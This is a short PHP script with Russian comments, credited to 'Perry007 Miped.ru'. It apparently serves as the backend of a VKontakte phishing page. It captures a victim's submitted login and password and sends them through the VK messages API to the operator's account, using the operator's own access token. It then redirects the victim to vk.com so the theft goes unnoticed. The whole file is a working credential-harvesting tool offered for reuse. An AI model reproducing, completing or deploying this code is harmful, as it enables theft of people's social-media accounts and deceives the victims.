<?php
$Log =$_POST['login'];
$Pass=$_POST['password'];
$text = "$Log:$Pass";
$token = 'ВАШ_ТОКЕН'; // ТУТ ВАШ ТОКЕН - ОТ АНДРОИДА ИЛИ ИНСТАГРАМА, НЕ ОТ АЙФОНА!
$post = file_get_contents ('https://api.vk.com/method/messages.send?user_id=ВАШ_ID&message='.urlencode($text).'&access_token='.$token);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";
//Сделал Perry007 Miped.ru
?>